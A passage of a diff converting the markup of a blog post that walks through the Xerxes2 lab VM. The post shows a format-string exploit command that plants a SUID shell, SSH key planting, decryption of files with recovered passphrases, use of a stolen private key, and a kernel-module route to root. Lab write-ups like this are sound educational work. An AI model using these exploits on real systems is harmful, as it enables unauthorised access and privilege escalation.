-<p>chmod +x the file so it is executable, and then run the following</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]delacroix@xerxes2:~$ echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;%8186u%16\$hn;\/tmp\/123.sh\x00&rsquo;&rdquo;) | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;[/plain]</p>
+<p> bash</p>
 
-<p>It will probably throw an error, but the shell script will run and you&rsquo;ll end up with a copy of /bin/sh in /tmp, with the SUID bit set, which when run will elevate you to the polito user.</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]
-1075339252delacroix@xerxes2:~$ ls -l /tmp
+<p>1075339252delacroix@xerxes2:~$ ls -l /tmp
 total 148
 -rw-r&ndash;r&ndash; 1 delacroix delacroix    53 Aug  6 12:07 file1
 -rw-r&ndash;r&ndash; 1 delacroix delacroix    61 Aug  6 13:03 file2
@@ -571,13 +778,19 @@ total 148
 delacroix@xerxes2:~$ /tmp/shell
 $ id
 uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) groups=1001(polito),1002(delacroix)
-$[/plain]</p>
+$</p>
 
-<p>I then did the same deal here - echo&rsquo;d my SSH public key to ~/.ssh/authorized_keys and SSH&rsquo;d in as polito.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I <span class="k">then</span> did the same deal here - <span class="nb">echo</span><span class="s1">&#39;d my SSH public key to ~/.ssh/authorized_keys and SSH&#39;</span>d in as polito.
+</span><span class='line'>
+</span><span class='line'>As a side note, I spoke to barrebas on IRC about my exploit route and he was able to refine it further
+</span></code></pre></td></tr></table></div></figure>
 
-<p>As a side note, I spoke to barrebas on IRC about my exploit route and he was able to refine it further</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;][00:15:55]  <barrebas>    sweet your exploit is much smaller than mine, nice!
+<p> bash
+[00:15:55]  <barrebas>  sweet your exploit is much smaller than mine, nice!
 [00:16:01]  <recrudesce>    really ???
 [00:16:19]  <barrebas>  yeah, i didn&rsquo;t use direct parameter addressing
 [00:16:33]  <barrebas>  and i wrote 4 bytes instead of 2, yours is smarter
@@ -585,19 +798,45 @@ $[/plain]</p>
 [00:25:48]  <barrebas>  a bit shorter still:
 [00:25:50]  <barrebas>  python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;;\/tmp\/123.sh;%8173u%16\$hn&rsquo;&rdquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;
 [00:26:08]  <recrudesce>    you know what, that looks like another one i did, but only slightly
-[00:26:36]  <barrebas>  anyway, nice work[/plain]</p>
+[00:26:36]  <barrebas>  anyway, nice work</p>
 
-<p><img src="http://www.playandroid.com/wp-content/uploads/2012/04/U-Mad-Bro.jpg" alt="" /></p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>!<span class="o">[](</span>http://www.playandroid.com/wp-content/uploads/2012/04/U-Mad-Bro.jpg<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>* * *
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">## Wandering the Operations Deck with Janice</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>!<span class="o">[](</span>http://img3.wikia.nocookie.net/__cb20111214193431/shodan/images/2/22/Janice_Polito_%28portrait%29.png<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Say hello to <span class="o">[</span>Janice Polito<span class="o">](</span>http://shodan.wikia.com/wiki/Janice_Polito<span class="o">)</span>, she<span class="s1">&#39;s got a smirk on her hasn&#39;</span>t she ?
+</span></code></pre></td></tr></table></div></figure>
 
-<hr />
 
-<h2>Wandering the Operations Deck with Janice</h2>
-
-<p><img src="http://img3.wikia.nocookie.net/__cb20111214193431/shodan/images/2/22/Janice_Polito_%28portrait%29.png" alt="" /></p>
-
-<p>Say hello to <a href="http://shodan.wikia.com/wiki/Janice_Polito">Janice Polito</a>, she&rsquo;s got a smirk on her hasn&rsquo;t she ?</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x70;&#x6f;&#108;&#105;&#116;&#111;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#48;&#46;&#x31;&#48;&#50;">&#x70;&#x6f;&#x6c;&#x69;&#116;&#111;&#64;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#x31;&#48;&#50;</a></p>
+<p> bash
+root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#58;&#112;&#111;&#108;&#x69;&#x74;&#111;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#49;&#48;&#50;">&#112;&#x6f;&#108;&#105;&#116;&#111;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#x32;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -619,23 +858,31 @@ polito@xerxes2:~$ ls -l
 total 172960
 -rw-r&ndash;r&ndash; 1 polito polito    142564 Jul 16 10:57 audio.txt
 -rw-r&ndash;r&ndash; 1 polito polito  44813850 Jul 16 12:17 dump.gpg
--rw-r&ndash;r&ndash; 1 polito polito     27591 Jul 16 12:19 polito.pdf
-[/plain]</p>
+-rw-r&ndash;r&ndash; 1 polito polito     27591 Jul 16 12:19 polito.pdf</p>
 
-<p>OK, so in /home/polito we have a PDF, a PGP&rsquo;d file and an audio.txt file.  This audio.txt is being served by nc on port 4444 - surprise !</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so in /home/polito we have a PDF, a PGP<span class="err">&#39;</span>d file and an audio.txt file.  This audio.txt is being served by nc on port <span class="m">4444</span> - surprise !
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~$ ps aux | grep 4444
+
+<p> bash</p>
+
+<p>polito@xerxes2:~$ ps aux | grep 4444
 polito    2175  0.0  0.1   1936   568 ?        Ss   Aug06   0:00 /bin/sh -c while true ; do nc -l -p 4444 &lt; /home/polito/audio.txt ; done
-polito   19481  0.0  0.1   1904   640 ?        S    08:56   0:00 nc -l -p 4444
-[/plain]</p>
+polito   19481  0.0  0.1   1904   640 ?        S    08:56   0:00 nc -l -p 4444</p>
 
-<p>Sit comfortably, children, for I have a story to tell about this PDF. I transferred it to my laptop, and opened it&hellip; a blank PDF. I decided there must be something hidden in the file. Now, I must admit my PDF forensics skills are somewhat lacking. However, people like Didier Stevens make life a little easier with their little Python tools such as <a href="http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser</a>.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Sit comfortably, children, <span class="k">for</span> I have a story to tell about this PDF. I transferred it to my laptop, and opened it... a blank PDF. I decided there must be something hidden in the file. Now, I must admit my PDF forensics skills are somewhat lacking. However, people like Didier Stevens make life a little easier with their little Python tools such as <span class="o">[</span>pdf-parser<span class="o">](</span>http://blog.didierstevens.com/programs/pdf-tools/<span class="o">)</span>.
+</span><span class='line'>
+</span><span class='line'>I used pdf-parser to see what the PDF contained
+</span></code></pre></td></tr></table></div></figure>
 
-<p>I used pdf-parser to see what the PDF contained</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# pdf-parser polito.pdf
+<p> bash</p>
+
+<p>root@pwk:~# pdf-parser polito.pdf
 PDF Comment &lsquo;%PDF-1.5\n&rsquo;</p>
 
 <p>obj 999 0
@@ -882,13 +1129,16 @@ PDF Comment &lsquo;%PDF-1.5\n&rsquo;</p>
 
 <p>PDF Comment &lsquo;%%EOF\n&rsquo;</p>
 
-<p>root@pwk:~#
-[/plain]</p>
+<p>root@pwk:~#</p>
 
-<p>So, a couple of objects, 2 fonts and an image. The ID&rsquo;s of interest are 999, 1, and 8. pdf-parser can be used to extract objects, so I extracted them all. 1 and 4 resulted in nothing interesting, 8 resulted in a text file that read &ldquo;foo&rdquo;, but 999 extracted as a file that looked like a PDF without headers.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, a couple of objects, <span class="m">2</span> fonts and an image. The ID<span class="err">&#39;</span>s of interest are 999, 1, and 8. pdf-parser can be used to extract objects, so I extracted them all. <span class="m">1</span> and <span class="m">4</span> resulted in nothing interesting, <span class="m">8</span> resulted in a text file that <span class="nb">read</span> <span class="s2">&quot;foo&quot;</span>, but <span class="m">999</span> extracted as a file that looked like a PDF without headers.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# cat pdf999_b
+
+<p> bash</p>
+
+<p>root@pwk:~# cat pdf999_b
 h?h??!Y??MZt
             ??????????U?u???????r?&ndash;WARNING&ndash;
    Unauthorized file access will be reported.
@@ -910,13 +1160,16 @@ x?mQ?n?0
         ??+|+H#%I   ?4?ڪu?M\?i
 ??? ??
       ????????Y?>E?? ?  ??p,(?cJ??{e??&ldquo;y????0MgqY<em>?#(s??M&amp;e6??8?zm?A??????? M??q?&ndash;I?y?uZ^?Z???$?l??*c-tj?????v3ߴ~S?2>[5ZT9???g??M?aU</em>?????䟲??VY??=?n?S?h?r?H?s&amp;`F?ry??ǆ??B/h?????mt?&#8220;?c?V?W??Ƨ?;??|?~ގ1??s5 ?????-9?0
-root@pwk:~#
-[/plain]</p></blockquote></blockquote>
+root@pwk:~#</p></blockquote></blockquote>
 
-<p>I used a hexeditor to add the PDF header and footer information</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I used a hexeditor to add the PDF header and footer information
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-00000000   83 E0 FF EB  1F 25 50 44  46 2D 31 2E  35 0A 68 E0  08 17 BC 00  10 68 C0 07  &hellip;..%PDF-1.5.h&hellip;&hellip;h..
+
+<p> bash</p>
+
+<p>00000000   83 E0 FF EB  1F 25 50 44  46 2D 31 2E  35 0A 68 E0  08 17 BC 00  10 68 C0 07  &hellip;..%PDF-1.5.h&hellip;&hellip;h..
 00000018   1F EB 21 59  81 F9 4D 5A  74 0C B4 0E  86 C1 CD 10  86 C5 CD 10  EB ED BE 55  ..!Y..MZt&hellip;&hellip;&hellip;&hellip;..U
 00000030   00 AC 75 02  EB FE B4 0E  CD 10 EB F5  EB 72 E9 2D  2D 57 41 52  4E 49 4E 47  ..u&hellip;&hellip;&hellip;.r.&ndash;WARNING
 00000048   2D 2D 0A 20  20 20 55 6E  61 75 74 68  6F 72 69 7A  65 64 20 66  69 6C 65 20  &ndash;.   Unauthorized file
@@ -952,13 +1205,16 @@ root@pwk:~#
 00000318   18 73 26 60  17 46 98 72  01 79 83 B6  C7 86 C0 83  42 2F 68 BF  FC 9B F8 F3  .s&amp;<code>.F.r.y......B/h.....
 00000330   6D 74 97 60  1E 11 60 82  63 C6 56 AF  57 D9 C8 C6  A7 C2 3B F9  C1 7C CB 7E  mt.</code>..`.c.V.W&hellip;..;..|.~
 00000348   DE 8E 31 E6  F5 73 35 20  DE FF 9E DB  E2 07 2D 39  89 30 0A 65  6E 64 73 74  ..1..s5 &hellip;&hellip;-9.0.endst
-00000360   72 65 61 6D  0A 65 6E 64  6F 62 6A 20  25 25 45 4F  46 0A                     ream.endobj %%EOF.
-[/plain]</p>
+00000360   72 65 61 6D  0A 65 6E 64  6F 62 6A 20  25 25 45 4F  46 0A                     ream.endobj %%EOF.</p>
 
-<p>I was then able to run this through pdf-parser again to get to object 4. Now, I wont show you that, what I will do is show you this conversation&hellip;</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I was <span class="k">then</span> able to run this through pdf-parser again to get to object 4. Now, I wont show you that, what I will <span class="k">do</span> is show you this conversation...
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-9:34 AM <recrudesce> yeah
+
+<p> bash</p>
+
+<p>9:34 AM <recrudesce> yeah
 9:35 AM <recrudesce> oooh, interesting
 9:35 AM <recrudesce> PDF Comment &lsquo;%\xd0\xd4\xc5\xd8\n&rsquo;
 9:35 AM <recrudesce> dunno if that&rsquo;s just because of the way i&rsquo;ve made the file
@@ -1011,46 +1267,69 @@ root@pwk:~#
 9:52 AM <superkojiman> was wondering why you were getting all excited when you extracted that.
 9:52 AM <superkojiman> i was like &ldquo;but i see it right here&hellip;&rdquo; :D
 9:53 AM <recrudesce> i made that a lot more complicated than i needed
-9:53 AM <recrudesce> feck
-[/plain]</p>
+9:53 AM <recrudesce> feck</p>
 
-<p>Turns out the PDF I had was corrupt, and that the actual PDF looks like this</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Turns out the PDF I had was corrupt, and that the actual PDF looks like this
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>!<span class="o">[</span>xerxes2_006<span class="o">](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png<span class="o">)](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>!<span class="o">[](</span>http://img3.wikia.nocookie.net/__cb20130417220142/mlp/images/6/61/FANMADE_Derp_by_WorkingOrder.gif<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Well didn<span class="s1">&#39;t I feel stupid ? The QR code decodes as &quot;XERXES is watching...&quot;, so that&#39;</span>s not of any use either. There<span class="s1">&#39;s got to be something still hidden in this PDF that I&#39;</span>m not seeing.
+</span></code></pre></td></tr></table></div></figure>
 
-<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png" alt="xerxes2_006" /></a></p>
 
-<p><img src="http://img3.wikia.nocookie.net/__cb20130417220142/mlp/images/6/61/FANMADE_Derp_by_WorkingOrder.gif" alt="" /></p>
+<p> bash</p>
 
-<p>Well didn&rsquo;t I feel stupid ? The QR code decodes as &ldquo;XERXES is watching&hellip;&rdquo;, so that&rsquo;s not of any use either. There&rsquo;s got to be something still hidden in this PDF that I&rsquo;m not seeing.</p>
+<p>root@pwk:~# file polito.pdf
+polito.pdf: x86 boot sector, code offset 0xe0</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# file polito.pdf
-polito.pdf: x86 boot sector, code offset 0xe0
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Wait, wut ? A bootable PDF ?
+</span><span class='line'>
+</span><span class='line'>!<span class="o">[](</span>http://www.reactiongifs.us/wp-content/uploads/2013/12/blinking_sword_in_the_stone.gif<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>OK, so, how to I boot this PDF I wonder ? Well, turns out this technique has already been used by <span class="o">[</span>PoC<span class="o">||</span>GTFO with their 2nd edition<span class="o">](</span>https://www.alchemistowl.org/pocorgtfo/pocorgtfo02.pdf<span class="o">)</span> - check out section <span class="m">8</span> to see instructions on using qemu. X11 forwarding required - luckily I <span class="nb">set </span>up X11 forwarding ages ago. Using the <span class="nb">command </span>found in PoC<span class="o">||</span>GTFO002, I ended up with the following screen
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>!<span class="o">[</span>xerxes2_007<span class="o">](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png<span class="o">)](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Nice, a password.  Lets get that dump file decrypted.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Wait, wut ? A bootable PDF ?</p>
 
-<p><img src="http://www.reactiongifs.us/wp-content/uploads/2013/12/blinking_sword_in_the_stone.gif" alt="" /></p>
+<p> bash</p>
 
-<p>OK, so, how to I boot this PDF I wonder ? Well, turns out this technique has already been used by <a href="https://www.alchemistowl.org/pocorgtfo/pocorgtfo02.pdf">PoC||GTFO with their 2nd edition</a> - check out section 8 to see instructions on using qemu. X11 forwarding required - luckily I set up X11 forwarding ages ago. Using the command found in PoC||GTFO002, I ended up with the following screen</p>
-
-<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png" alt="xerxes2_007" /></a></p>
-
-<p>Nice, a password.  Lets get that dump file decrypted.</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~$ gpg &ndash;output output.bin &ndash;decrypt dump.gpg
+<p>polito@xerxes2:~$ gpg &ndash;output output.bin &ndash;decrypt dump.gpg
 gpg: CAST5 encrypted data
 Enter passphrase: amFuaWNl
 pg: encrypted with 1 passphrase
 gpg: WARNING: message was not integrity protected
 polito@xerxes2:~$ ls -l output.bin
--rw-r&ndash;r&ndash; 1 polito polito 132120576 Aug  8 11:55 output.bin
-[/plain]</p>
+-rw-r&ndash;r&ndash; 1 polito polito 132120576 Aug  8 11:55 output.bin</p>
 
-<p>I am going to assume this is a memory dump, so I figured the first thing to do was to run strings on it - it scrolled text for ages&hellip; I need to be more defined.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I am going to assume this is a memory dump, so I figured the first thing to <span class="k">do</span> was to run strings on it - it scrolled text <span class="k">for</span> ages... I need to be more defined.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~$ strings output.bin | grep korenchkin
+
+<p> bash</p>
+
+<p>polito@xerxes2:~$ strings output.bin | grep korenchkin
 korenchkin.tar.enc
 cat /home/korenchkin/.ssh/id_rsa
 /home/korenchkin/.ssh/id_rsa
@@ -1145,7 +1424,7 @@ korenchkin@xerxes2:~$ .32.1
 ]0;korenchkin@xerxes2: ~
 korenchkin@xerxes2:~$
 ts/0korenchkin
-2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x72;&#x6f;&#x6f;&#116;&#64;&#120;&#x65;&#x72;&#120;&#x65;&#x73;&#50;&#46;&#x74;&#114;&#105;&#111;&#112;&#116;&#x69;&#109;&#x75;&#x6d;">&#114;&#111;&#111;&#116;&#x40;&#x78;&#x65;&#x72;&#120;&#101;&#115;&#50;&#x2e;&#116;&#x72;&#105;&#x6f;&#x70;&#116;&#x69;&#x6d;&#x75;&#x6d;</a> R=local_user T=mail_spool
+2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x72;&#111;&#x6f;&#x74;&#64;&#120;&#101;&#114;&#120;&#101;&#x73;&#50;&#x2e;&#x74;&#x72;&#105;&#x6f;&#112;&#116;&#105;&#x6d;&#x75;&#x6d;">&#x72;&#111;&#x6f;&#116;&#x40;&#x78;&#101;&#x72;&#x78;&#101;&#115;&#50;&#46;&#116;&#114;&#105;&#111;&#x70;&#116;&#x69;&#109;&#x75;&#109;</a> R=local_user T=mail_spool
 ]0;korenchkin@x
 korenchkin
 korenchkin
@@ -1264,17 +1543,24 @@ korenchkin
 /home/korenchkin
 korenchkin
 korenchkin
-polito@xerxes2:~$
-[/plain]</p>
+polito@xerxes2:~$</p>
 
-<p>That&rsquo;s more workable - but wait, what&rsquo;s that&hellip; a tarball encrypted into /opt/backup/ ?</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>That<span class="s1">&#39;s more workable - but wait, what&#39;</span>s that... a tarball encrypted into /opt/backup/ ?
+</span><span class='line'>
+</span><span class='line'>!<span class="o">[](</span>http://1.bp.blogspot.com/_pS7sKjlzwFg/TOMG_De_jfI/AAAAAAAAGX4/XfN7NH07GiA/s320/quagmire_jackpot.gif<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>OpenSSL can be used to decrypt the file to get the original tarball.
+</span></code></pre></td></tr></table></div></figure>
 
-<p><img src="http://1.bp.blogspot.com/_pS7sKjlzwFg/TOMG_De_jfI/AAAAAAAAGX4/XfN7NH07GiA/s320/quagmire_jackpot.gif" alt="" /></p>
 
-<p>OpenSSL can be used to decrypt the file to get the original tarball.</p>
+<p> bash</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~$ openssl aes-256-cbc -d -salt -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out /home/polito/korenchkin/korenchkin.tar
+<p>polito@xerxes2:~$ openssl aes-256-cbc -d -salt -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out /home/polito/korenchkin/korenchkin.tar
 polito@xerxes2:~$ ls -l korenchkin/
 total 12
 -rw-r&ndash;r&ndash; 1 polito polito 10240 Aug  8 12:05 korenchkin.tar
@@ -1282,13 +1568,16 @@ polito@xerxes2:~$ cd korenchkin/
 polito@xerxes2:~/korenchkin$ tar xvf korenchkin.tar
 .ssh/id_rsa
 .ssh/id_rsa.pub
-polito@xerxes2:~/korenchkin$
-[/plain]</p>
+polito@xerxes2:~/korenchkin$</p>
 
-<p>Looks like Korenchkin is sensible and backs up his keypair&hellip; but now I have it, so user impersonation is possible.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Looks like Korenchkin is sensible and backs up his keypair... but now I have it, so user impersonation is possible.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x6b;&#x6f;&#114;&#x65;&#x6e;&#x63;&#104;&#107;&#x69;&#110;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#46;&#x30;&#x2e;&#49;">&#107;&#111;&#x72;&#x65;&#x6e;&#99;&#104;&#107;&#105;&#x6e;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#48;&#46;&#x31;</a>
+
+<p> bash</p>
+
+<p>polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x6b;&#x6f;&#x72;&#101;&#110;&#99;&#x68;&#107;&#105;&#110;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#x30;&#46;&#49;">&#107;&#x6f;&#114;&#x65;&#110;&#x63;&#104;&#x6b;&#105;&#110;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#49;</a>
 The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -1311,80 +1600,149 @@ Warning: Permanently added &lsquo;127.0.0.1&rsquo; (ECDSA) to the list of known 
 <p>You have new mail.
 korenchkin@xerxes2:~$ id
 uid=1000(korenchkin) gid=1000(korenchkin) groups=1000(korenchkin),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
-korenchkin@xerxes2:~$
-[/plain]</p>
+korenchkin@xerxes2:~$</p>
 
-<p>Once again, my public key is echo&rsquo;d into .ssh/authorized_keys, and I am able to SSH in from my client.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Once again, my public key is <span class="nb">echo</span><span class="err">&#39;</span>d into .ssh/authorized_keys, and I am able to SSH in from my client.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>* * *
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">## Holding the Con with Anatoly</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>!<span class="o">[](</span>http://img1.wikia.nocookie.net/__cb20120107145214/shodan/images/e/e1/Korenchkin.png<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>With great power comes great responsibility.  This is <span class="o">[</span>Anatoly Korenchkin<span class="o">](</span>http://shodan.wikia.com/wiki/Anatoly_Korenchkin<span class="o">)</span>.
+</span><span class='line'>
+</span><span class='line'>Korenchkin must be able to <span class="k">do</span> some important stuff - after all he worked alongside the captain of the Von Braun. Turns out my suspicion was correct
+</span></code></pre></td></tr></table></div></figure>
 
-<hr />
 
-<h2>Holding the Con with Anatoly</h2>
+<p> bash</p>
 
-<p><img src="http://img1.wikia.nocookie.net/__cb20120107145214/shodan/images/e/e1/Korenchkin.png" alt="" /></p>
-
-<p>With great power comes great responsibility.  This is <a href="http://shodan.wikia.com/wiki/Anatoly_Korenchkin">Anatoly Korenchkin</a>.</p>
-
-<p>Korenchkin must be able to do some important stuff - after all he worked alongside the captain of the Von Braun. Turns out my suspicion was correct</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]
-korenchkin@xerxes2:~$ sudo -l
+<p>korenchkin@xerxes2:~$ sudo -l
 Matching Defaults entries for korenchkin on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
 
 <p>User korenchkin may run the following commands on this host:
     (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
-korenchkin@xerxes2:~$  [/plain]</p>
+korenchkin@xerxes2:~$</p>
 
-<p>Korenchkin can load and remove kernel modules as root without a password. This could be interesting as I have no idea about how kernel modules work. I started off compiling and loading a simple Hello World module from <a href="http://www.thegeekstuff.com/2013/07/write-linux-kernel-module/">TheGeekStuff</a>. It worked ! But can I make a malicious kernel module - possibly one that can read /root/flag.txt ? Yup, and here&rsquo;s the code to do it.</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
